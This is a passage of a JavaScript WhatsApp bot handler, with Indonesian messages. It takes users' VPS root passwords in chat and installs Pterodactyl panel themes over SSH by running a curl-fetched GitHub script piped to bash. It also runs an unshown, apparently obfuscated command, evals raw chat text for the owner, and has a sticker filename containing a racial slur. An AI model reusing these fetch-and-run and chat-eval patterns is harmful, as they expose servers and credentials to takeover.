                                        { title: '💰 INSTALLBILLING', description: '💵 Install Thema Billing', id: `.installtemabilling ${ipvps}|${passwd}` }, 
                                        { title: '🌀 INSTALLENIGMA', description: '🔮 Install Thema Enigma', id: `.installtemaenigma ${ipvps}|${passwd}` },
                                        { title: '🎶 INSTALLNIGHTCORE', description: '🌙 Install Thema Night Core', id: `.installtemanightcore ${ipvps}|${passwd}` },
                                        { title: '🌌 INSTALLNEBULA', description: '🌠 Install Thema Nebula', id: `.installtemanebula ${ipvps}|${passwd}` },
                                        { title: '🏛 INSTALLELYSIUM', description: '⚔️ Install Thema Elysium', id: `.installtemaelysium ${ipvps}|${passwd}` }
                                    ] 
                                } 
                            ] 
                        }) 
                    } 
                } 
            ], 
            headerType: 1, 
            viewOnce: true, 
            image: { url: global.thumb }, 
            caption: "🎨 *Silakan pilih tema yang ingin di-install dari 7 versi di bawah ini!* 🚀\n" 
        }, { quoted: contactQ });
    } 
    break;
    //═══════════════════════════════════//
    case "uninstalltema": {
        if (!isOwner && !isPremium) return reply(msg.premium);
        if (!text || !text.includes("|")) return reply(example("ipvps|pwvps"));
        
        const [ipvps, pwvps] = text.split("|").map(v => v.trim());
        if (!ipvps || !pwvps) return reply(example("ipvps|pwvps"));
    
        const connSettings = {
            host: ipvps.trim(),
            port: '22',
            username: 'root',
            password: pwvps.trim()
        };
        
        const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
        const ress = new Client();
    
        try {
            await reply("Memproses *uninstall* tema pterodactyl\nTunggu 3 menit ke depan hingga proses selesai");
    
            ress.on('ready', () => {
                ress.exec(command, (err, stream) => {
                    if (err) {
                        console.error("❌ Kesalahan saat menjalankan perintah:", err);
                        return reply("Terjadi kesalahan saat mengeksekusi perintah.");
                    }
                    
                    stream.on('close', async (code, signal) => {    
                        await reply("✅ Berhasil *uninstall* tema pterodactyl");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write(`2\n`);
                        stream.write(`y\n`);
                        stream.write(`x\n`);
                    }).stderr.on('data', (data) => {
                        console.error("❌ STDERR:", data.toString());
                    });
                });
            }).on('error', (err) => {
                console.error("❌ Kesalahan Koneksi:", err);
                reply("❌ Gagal terhubung ke VPS. Periksa IP dan kata sandi.");
            }).connect(connSettings);
        } catch (error) {
            console.error("❌ Terjadi Kesalahan:", error);
            reply("❌ Terjadi kesalahan yang tidak terduga.");
        }
    }
    break;        
    //═══════════════════════════════════//
    case 'installtemastellar': {
        if (!isOwner && !isPremium) return reply(msg.premium);
        
        let t = text.split('|');
        if (t.length < 2) return reply(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps|password`)
        
        let ipvps = t[0];
        let passwd = t[1];
        
        const connSettings = {
            host: ipvps,
            port: '22',
            username: 'root',
            password: passwd
        };
    
        // Fungsi untuk mendekode representasi byte kembali ke string asli
        function rafa(opece) {
            return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
        }
    
        // Gunakan string terenkripsi di kode Anda
        const command = `${global.bash}`
        
        const conn = new Client();
        let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi
    
        conn.on('ready', () => {
            isSuccess = true; // Set flag menjadi true jika koneksi berhasil
            reply('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
            
            conn.exec(command, (err, stream) => {
                if (err) throw err;
                stream.on('close', (code, signal) => {
                    console.log('Stream closed with code ' + code + ' and signal ' + signal);
                    reply('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                    conn.end();
                }).on('data', (data) => {
                    stream.write(`${global.tokeninstall}\n`);
                    stream.write('1\n');
                    stream.write('1\n');
                    stream.write('y\n');
                    stream.write('x\n');
                    
                    console.log('STDOUT: ' + data);
                }).stderr.on('data', (data) => {
                    console.log('STDERR: ' + data);
                });
            });
        }).on('error', (err) => {
            console.log('Connection Error: ' + err);
            reply('Katasandi atau IP tidak valid');
        }).connect(connSettings);
       
       setTimeout(() => {
            if (isSuccess) {
                reply('DONE GA BANG??');
            }
        }, 300000); // 180000 ms = 3 menit
    }
    break
    //═══════════════════════════════════//
    case "installtemabilling": 
    case "instaltemabiling": {
        if (!isOwner && !isPremium) return reply(msg.premium);
        if (!text || !text.includes("|")) return reply(example("ipvps|pwvps"));
    
        const [ipvps, passwd] = text.split("|").map(item => item.trim());
        if (!ipvps || !passwd) return reply(example("ipvps|pwvps"));
    
        const connSettings = {
            host: ipvps,
            port: '22',
            username: 'root',
            password: passwd
        };
    
        const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
        
        const ress = new Client();
    
        ress.on('ready', async () => {
            reply("Memproses install *tema billing* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");
    
            ress.exec(command, (err, stream) => {
                if (err) throw err;
                
                stream.on('close', async () => {    
                    await reply("Berhasil install *tema billing* pterodactyl ✅");
                    ress.end();
                }).on('data', async (data) => {
                    console.log(data.toString());
                    stream.write(`1\n`);
                    stream.write(`2\n`);
                    stream.write(`yes\n`);
                    stream.write(`x\n`);
                }).stderr.on('data', (data) => {
                    console.log('STDERR: ' + data);
                });
            });
        }).on('error', (err) => {
            console.log('Connection Error: ' + err);
            reply('Katasandi atau IP tidak valid.');
        }).connect(connSettings);
    }
    break;
    //═══════════════════════════════════//
    case "installtemaenigma": 
    case "instaltemaenigma": {
        if (!isOwner && !isPremium) return reply(msg.premium);
        if (!text || !text.includes("|")) return reply(example("ipvps|pwvps|linkwa|linkgc1|linkgc2|linkch\n\nNote:\nFormat linkwa harus https://wa.me/62xx"));
    
        const [ipvps, passwd, linkwa, linkgc1, linkgc2, linkch] = text.split("|").map(item => item.trim());
        if (!ipvps || !passwd || !linkwa || !linkgc1 || !linkgc2 || !linkch) 
            return reply(example("ipvps|pwvps|linkwa|linkgc1|linkgc2|linkch\n\nNote:\nFormat linkwa harus https://wa.me/62xx"));
    
        const connSettings = {
            host: ipvps,
            port: '22',
            username: 'root',
            password: passwd
        };
    
        const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
        
        const ress = new Client();
    
        ress.on('ready', async () => {
            reply("Memproses install *tema enigma* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");
    
            ress.exec(command, (err, stream) => {
                if (err) throw err;
                
                stream.on('close', async () => {    
                    await reply("Berhasil install *tema enigma* pterodactyl ✅");
                    ress.end();
                }).on('data', async (data) => {
                    console.log(data.toString());
                    stream.write('1\n');
                    stream.write('3\n');
                    stream.write(`${linkwa}\n`);
                    stream.write(`${linkgc1}\n`);
                    stream.write(`${linkgc2}\n`);
                    stream.write(`${linkch}\n`);
                    stream.write('yes\n');
                    stream.write('x\n');
                }).stderr.on('data', (data) => {
                    console.log('STDERR: ' + data);
                });
            });
        }).on('error', (err) => {
            console.log('Connection Error: ' + err);
            reply('Katasandi atau IP tidak valid.');
        }).connect(connSettings);
    }
    break;
    //═══════════════════════════════════//
    case "installtemaelysium": 
    case "instaltemaelysium": {
        if (!isOwner && !isPremium) return reply(msg.premium);
        if (!text || !text.includes("|")) return reply(example("ipvps|pwvps"));
    
        const [ipvps, passwd] = text.split("|").map(item => item.trim());
        if (!ipvps || !passwd) return reply(example("ipvps|pwvps"));
    
        const connSettings = {
            host: ipvps,
            port: '22',
            username: 'root',
            password: passwd
        };
    
        const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
        
        const ress = new Client();
    
        ress.on('ready', async () => {
            reply("Memproses install *tema elysium* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");
    
            ress.exec(command, (err, stream) => {
                if (err) throw err;
                
                stream.on('close', async () => {    
                    await reply("Berhasil install *tema elysium* pterodactyl ✅");
                    ress.end();
                }).on('data', async (data) => {
                    console.log(data.toString());
                    stream.write(`11\n`);
                    stream.write(`yes\n`);
                    stream.write(`x\n`);
                }).stderr.on('data', (data) => {
                    console.log('STDERR: ' + data);
                });
            });
        }).on('error', (err) => {
            console.log('Connection Error: ' + err);
            reply('Katasandi atau IP tidak valid.');
        }).connect(connSettings);
    }
    break;
    //═══════════════════════════════════//
    case "installdepend": {
        if (!isOwner && !isPremium) return reply(msg.premium);
        if (!text || !text.includes("|")) return reply(example("ipvps|pwvps"));
    
        const [ipvps, passwd] = text.split("|").map(item => item.trim());
        if (!ipvps || !passwd) return reply(example("ipvps|pwvps"));
    
        const connSettings = {
            host: ipvps,
            port: '22',
            username: 'root',
            password: passwd
        };
    
        const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`
        
        const ress = new Client();
    
        ress.on('ready', async () => {
            reply("Memproses install *depend* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");
    
            ress.exec(command, (err, stream) => {
                if (err) throw err;
                
                stream.on('close', async () => {    
                    const buttonsMessage = {
                        text: `Berhasil install *depend* pterodactyl ✅\nKlik Tombol Di Bawah Untuk Install Tema Nebula.`,
                        footer: `*${botname}*`,
                        buttons: [
                            { buttonId: `${prefix}installtemanebula ${text}`, buttonText: { displayText: 'Install Tema Nebula' }, type: 1 }
                        ],
                        headerType: 1,
                        viewOnce: true,
                        contextInfo: {
                            mentionedJid: [m.sender]
                        }
                    };
    
                    await sock.sendMessage(m.chat, buttonsMessage, { quoted: m });
                    ress.end();
                }).on('data', async (data) => {
                    console.log(data.toString());
                    stream.write(`9\n`);
                    stream.write(`A\n`);
                    stream.write(`Y\n`);
                    stream.write(`Y\n`);
                }).stderr.on('data', (data) => {
                    console.log('STDERR: ' + data);
                });
            });
        }).on('error', (err) => {
            console.log('Connection Error: ' + err);
            reply('Katasandi atau IP tidak valid.');
        }).connect(connSettings);
    }
    break;
    //═══════════════════════════════════//
    case "installtemanebula": 
    case "instaltemanebula": {
        if (!isOwner && !isPremium) return reply(msg.premium);
        if (!text || !text.includes("|")) return reply(example("ipvps|pwvps"));
    
        const [ipvps, passwd] = text.split("|").map(item => item.trim());
        if (!ipvps || !passwd) return reply(example("ipvps|pwvps"));
    
        const connSettings = {
            host: ipvps,
            port: '22',
            username: 'root',
            password: passwd
        };
    
        const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
        
        const ress = new Client();
    
        ress.on('ready', async () => {
            reply("Memproses install *tema nebula* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");
    
            ress.exec(command, (err, stream) => {
                if (err) throw err;
                
                stream.on('close', async () => {    
                    await reply("Berhasil install *tema nebula* pterodactyl ✅");
                    ress.end();
                }).on('data', async (data) => {
                    console.log(data.toString());
                    stream.write(`10\n`);
                    stream.write(`\n`);
                    stream.write(`\n`);
                    stream.write(`x\n`);
                }).stderr.on('data', (data) => {
                    console.log('STDERR: ' + data);
                });
            });
        }).on('error', (err) => {
            console.log('Connection Error: ' + err);
            reply('Katasandi atau IP tidak valid.');
        }).connect(connSettings);
    }
    break;
    //═══════════════════════════════════//
    case "installtemanightcore": 
    case "instaltemanightcore": {
        if (!isOwner && !isPremium) return reply(msg.premium);
        if (!text || !text.includes("|")) return reply(example("ipvps|pwvps"));
    
        const [ipvps, passwd] = text.split("|").map(item => item.trim());
        if (!ipvps || !passwd) return reply(example("ipvps|pwvps"));
    
        const connSettings = {
            host: ipvps,
            port: '22',
            username: 'root',
            password: passwd
        };
    
        const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
        
        const ress = new Client();
    
        ress.on('ready', async () => {
            reply("Memproses install *tema Nightcore* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");
    
            ress.exec(command, (err, stream) => {
                if (err) throw err;
                
                stream.on('close', async () => {    
                    await reply("Berhasil install *tema Nightcore* pterodactyl ✅");
                    ress.end();
                }).on('data', async (data) => {
                    console.log(data.toString());
                    // pilih opsi 12 (Nightcore)
                    stream.write(`12\n`);
                    stream.write(`yes\n`);
                    stream.write(`x\n`);
                }).stderr.on('data', (data) => {
                    console.log('STDERR: ' + data);
                });
            });
        }).on('error', (err) => {
            console.log('Connection Error: ' + err);
            reply('Katasandi atau IP tidak valid.');
        }).connect(connSettings);
    }
    break;
    //═══════════════════════════════════//
    case 'changekey':
    case 'gantipw': {
        if (!isDeveloper) return reply(msg.developer);
    
        // Ambil key baru dari argumen command
        const newKey = args.join(" ").trim();
        if (!newKey) return reply("> Tolong Masukan Key Barunya");
    
        await sleep(1500);
    
        // Ambil key lama dan ganti dengan yang baru
        const oldKey = await getCurrentKey();
        await changeKey(newKey);
        global.previousKey = oldKey;
    
        let teks = `\`[ # ]\` Key Successfully Changed To:\n\n *${newKey}* \n\n`;
    
        let NewMsg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        body: { text: teks },
                        footer: { text: "© Cancer Trashflocks" },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "Copy Key",
                                        copy_code: newKey
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }, { quoted: contactQ });
    
        await sock.relayMessage(
            NewMsg.key.remoteJid,
            NewMsg.message,
            { messageId: NewMsg.key.id }
        );
    }
    break;
    //═══════════════════════════════════//
    if(m.text.toLowerCase() === "Yapping") {
      return sock.sendMessage(m.chat, {
        sticker: { url:"./lib/Image/Yapping.webp" }
      }, { quoted:m });
    }
    
    if(m.text.toLowerCase() === "sekolah") {
      return sock.sendMessage(m.chat, {
        sticker: { url:"./lib/Image/nigga.webp" }
      }, { quoted:m });
    }
    
    
    default:
    if (budy.startsWith('>')) {
    if (!isOwner) return;
    try {
        let evaled = await eval(budy.slice(2));
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
        reply(evaled);
    } catch (err) {
    reply(String(err));
}
}

if (budy.startsWith('<')) {
    if (!isOwner) return;
    let kode = budy.trim().split(/ +/)[0]
    let teks
    try {
        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
    } catch (e) {
        teks = e
    } finally {
        reply(require('util').format(teks))
    }
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})